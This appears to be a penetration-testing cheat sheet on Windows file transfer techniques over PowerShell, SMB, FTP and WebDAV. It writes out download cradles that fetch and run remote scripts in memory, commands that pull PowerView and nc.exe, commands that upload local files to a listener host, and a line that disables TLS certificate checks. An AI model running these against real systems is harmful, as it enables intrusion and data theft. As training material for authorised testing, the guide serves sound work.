# 🛰️ File Transfer Techniques on Windows Using PowerShell

---

## Download Operations

### Web Requests with WebClient

**Download via WebClient:**
```powershell
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'PowerView.ps1')
```

**Using PowerShell Built-In Methods:**
```powershell
# Available from PowerShell 3.0 onwards (slower than WebClient)
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Using aliases
iwr https://example.com/file.txt -OutFile file.txt
curl https://example.com/file.txt -OutFile file.txt
wget https://example.com/file.txt -OutFile file.txt
```

### Common Errors and Solutions:

1. **Internet Explorer Configuration Error:**
```powershell
# Error: Internet Explorer first-launch configuration not complete
# Solution: Use -UseBasicParsing parameter
Invoke-WebRequest https://example.com/file.txt -UseBasicParsing | IEX
```

2. **SSL/TLS Certificate Error:**
```powershell
# Bypass SSL certificate validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads

The Server Message Block protocol (SMB) runs on port TCP/445 and is common in enterprise networks.

**Create SMB Server on Linux:**
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

**Download from SMB Server:**
```cmd
copy \\192.168.220.133\share\nc.exe
```

**For newer Windows versions (authenticated SMB):**
```bash
# Create SMB server with credentials
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
# Mount SMB share with credentials
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

## FTP Downloads

FTP uses ports TCP/21 and TCP/20 for file transfers.

**Setup FTP Server on Linux:**
```bash
# Install pyftpdlib
sudo pip3 install pyftpdlib

# Start FTP server
sudo python3 -m pyftpdlib --port 21
```

**Download via PowerShell:**
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

**Download via FTP Client (non-interactive):**
```cmd
# Create command file
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt

# Execute FTP commands
ftp -v -n -s:ftpcommand.txt
```

## Upload Operations

### PowerShell Base64 Encode & Decode

**Encode File on Windows:**
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

**Get MD5 Hash on Windows:**
```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

**Decode Base64 on Linux:**
```bash
echo <base64_string> | base64 -d > hosts
md5sum hosts  # Verify hash
```

### PowerShell Web Uploads

PowerShell doesn't have a built-in upload function, but we can use `Invoke-WebRequest` or `Invoke-RestMethod`.

**Setup Upload Server on Linux:**
```bash
# Install uploadserver
pip3 install uploadserver

# Start upload server
python3 -m uploadserver
# File upload available at /upload on port 8000
```

**Upload via PowerShell Script:**
```powershell
# Download and use PSUpload.ps1
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

**Base64 Web Upload:**
```powershell
# Encode and POST via web request
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

**Catch with Netcat:**
```bash
nc -lvnp 8000
# Then decode the base64 content
echo <base64_content> | base64 -d -w 0 > hosts
```

### SMB Uploads

Companies usually allow outbound HTTP/HTTPS but block SMB (TCP/445). Alternative is to run SMB over HTTP with WebDAV.

**WebDAV Setup:**
```bash
# Install WebDAV modules
sudo pip3 install wsgidav cheroot

# Start WebDAV server
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

**Connect to WebDAV Share:**
```cmd
# Connect to WebDAV
dir \\192.168.49.128\DavWWWRoot

# Upload files
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\
```

**⚠️ Note:** `DavWWWRoot` is a special keyword recognized by Windows Shell for WebDAV root connection.

### FTP Uploads

**Setup FTP Server with Write Access:**
```bash
sudo python3 -m pyftpdlib --port 21 --write
```

**Upload via PowerShell:**
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

**Upload via FTP Client:**
```cmd
# Create upload command file
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt

# Execute upload
ftp -v -n -s:ftpcommand.txt
```

## Key Takeaways

1. **PowerShell** is the most versatile tool for file transfers on Windows
2. **Base64 encoding** is useful for small files and bypassing restrictions
3. **SMB** is fast but often blocked by firewalls
4. **HTTP/HTTPS** methods are most likely to work due to firewall policies
5. **WebDAV** provides SMB-like functionality over HTTP
6. **FTP** is reliable but may require firewall configuration
7. Always verify file integrity with hash comparisons
8. Consider "fileless" methods that execute directly in memory

## References

- [PowerShell Download Cradles by Harmj0y](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
- [Microsoft - Preventing SMB traffic](https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/prevent-smb-traffic)
- [WebDAV RFC 4918](https://tools.ietf.org/html/rfc4918) 

---

[!WARNING] This document includes potentially harmful techniques and is intended for educational or ethical hacking purposes only. Use responsibly and with proper authorization.

---